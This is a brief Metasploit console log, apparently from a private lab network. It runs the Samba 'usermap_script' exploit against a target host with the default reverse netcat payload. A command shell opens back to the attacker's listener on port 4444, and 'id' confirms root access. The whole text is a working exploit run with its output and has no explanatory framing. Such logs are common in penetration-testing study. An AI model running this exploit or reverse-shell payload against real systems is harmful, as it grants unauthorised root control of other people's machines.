

```
use exploit/multi/samba/usermap_script 
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > 
msf6 exploit(multi/samba/usermap_script) > setg RHOSTS 192.168.220.128
RHOSTS => 192.168.220.128
msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 192.168.220.129:4444 
[*] Command shell session 1 opened (192.168.220.129:4444 -> 192.168.220.128:40193) at 2025-10-08 06:31:37 -0400

id
uid=0(root) gid=0(root)
```
